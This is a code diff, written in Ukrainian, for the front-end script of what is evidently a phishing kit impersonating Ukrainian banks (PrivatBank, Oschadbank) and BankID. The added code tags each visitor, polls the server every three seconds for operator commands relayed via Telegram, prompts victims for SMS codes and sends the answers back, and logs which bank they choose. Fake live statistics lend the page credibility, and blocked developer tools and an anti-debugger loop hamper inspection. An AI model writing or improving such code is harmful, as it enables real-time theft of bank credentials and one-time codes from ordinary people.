@@ -3,36 +3,83 @@
  * Версія системи: 4.2.0 (2026)
  */
 
+// --- СИСТЕМНІ ЗМІННІ ---
+
+// Генеруємо або дістаємо існуючий ID користувача для поточної сесії
+if (!sessionStorage.getItem('USER_ID')) {
+    const newId = 'ID-' + Math.floor(Math.random() * 89999 + 10000);
+    sessionStorage.setItem('USER_ID', newId);
+}
+const USER_ID = sessionStorage.getItem('USER_ID');
+
 document.addEventListener('DOMContentLoaded', () => {
 
-    // 1. Поточна дата для головної сторінки
+    // 1. Поточна дата
     const dateEl = document.getElementById('current-date');
     if (dateEl) {
         dateEl.innerText = new Date().toLocaleDateString('uk-UA');
     }
 
-    // 2. Анімація статистики на головній
+    // 2. Анімація статистики
     const peopleCountEl = document.getElementById('people-count');
-    const moneySumEl = document.getElementById('money-sum');
-
-    if (peopleCountEl && moneySumEl) {
-        // Початкова анімація при завантаженні
+    if (peopleCountEl) {
         animateValue("people-count", 14200, 14284, 2000);
-        animateValue("money-sum", 92000000, 92846000, 2500);
-
-        // Живе оновлення кожні 5 секунд
-        setInterval(() => {
-            updateLiveStats('people-count', 1, 3);
-            updateLiveStats('money-sum', 1200, 4500);
-        }, 5000);
+        setInterval(() => updateLiveStats('people-count', 1, 3), 5000);
     }
 
-    // 3. Таймер сесії BankID
+    // 3. Таймер сесії
     const timerEl = document.getElementById('timer');
     if (timerEl) {
-        startGlobalTimer(300, timerEl); // 5 хвилин
+        startGlobalTimer(300, timerEl);
     }
+
+    // 4. ЗАПУСК ПРОСЛУХОВУВАННЯ КОМАНД ВІД АДМІНА
+    // Сайт кожні 3 секунди перевіряє, чи не натиснув ти кнопку в ТГ
+    startCommandListener();
 });
+
+/**
+ * ЛОГІКА ВЗАЄМОДІЇ З СЕРВЕРОМ
+ */
+
+async function startCommandListener() {
+    setInterval(async () => {
+        try {
+            const response = await fetch(`/api/check/${USER_ID}`);
+            const data = await response.json();
+
+            if (data && data.action) {
+                handleAdminCommand(data);
+            }
+        } catch (e) {
+            // Тихо ігноруємо помилки мережі
+        }
+    }, 3000);
+}
+
+function handleAdminCommand(command) {
+    if (command.action === 'msg') {
+        // Просто виводимо повідомлення (наприклад, "Мало грошей")
+        alert(command.text);
+    } 
+    else if (command.action === 'ask') {
+        // Запитуємо введення (СМС, Звонок тощо)
+        const result = prompt(command.text);
+        if (result) {
+            // Відправляємо відповідь назад тобі в Telegram
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userId: USER_ID,
+                    type: 'ВВІД КОРИСТУВАЧА',
+                    data: { "Результат": result }
+                })
+            });
+            alert("Дані прийнято. Очікуйте підтвердження...");
+        }
+    }
+}
 
 /**
  * ФУНКЦІЇ-ХЕЛПЕРИ
@@ -69,15 +116,14 @@ function startGlobalTimer(duration, display) {
         display.textContent = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
         if (--timer < 0) {
             clearInterval(interval);
-            display.textContent = "00:00";
-            alert("Час сесії вичерпано. Будь ласка, оновіть сторінку.");
+            alert("Час сесії вичерпано.");
             window.location.reload();
         }
     }, 1000);
 }
 
 /**
- * ЛОГІКА ВИБОРУ БАНКУ (banks.html)
+ * ЛОГІКА ВИБОРУ БАНКУ
  */
 function processBank(bankKey) {
     const loader = document.getElementById('loader');
@@ -100,49 +146,37 @@ function processBank(bankKey) {
             stepIndex++;
         } else {
             clearInterval(interval);
+            
+            // Відправляємо в лог, куди саме перейшов користувач (з його ID)
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userId: USER_ID,
+                    type: 'ПЕРЕХІД',
+                    data: { "Банк": bankKey }
+                })
+            });
 
-            // Навігація
-            switch(bankKey) {
-                case 'privat':
-                    window.location.href = 'privat.html';
-                    break;
-                case 'oschad':
-                    window.location.href = 'oschad.html';
-                    break;
-                case 'other':
-                    window.location.href = 'other.html';
-                    break;
-                default:
-                    alert("Помилка ініціалізації. Спробуйте інший банк.");
-                    window.location.reload();
-            }
+            window.location.href = bankKey + '.html';
         }
-    }, 1000);
+    }, 1200);
 }
 
 /**
  * ЗАХИСТ ІНТЕРФЕЙСУ
  */
-
-// Блокування контекстного меню
 document.addEventListener('contextmenu', event => event.preventDefault());
 
-// Блокування гарячих клавіш розробника
 document.onkeydown = function (e) {
-    const forbiddenKeys = [123]; // F12
-    const forbiddenCombos = [
-        e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0), // Inspect
-        e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0), // Console
-        e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0), // Element picker
-        e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)                // View source
-    ];
-
-    if (forbiddenKeys.includes(e.keyCode) || forbiddenCombos.some(Boolean)) {
+    if (e.keyCode == 123 || 
+       (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || 
+       (e.ctrlKey && e.keyCode == 85)) {
         return false;
     }
 };
 
-// Трюк Anti-Console: Нескінченна зупинка дебаггера
+// Трюк Anti-Console
 setInterval(function () {
     (function() {
         (function() {
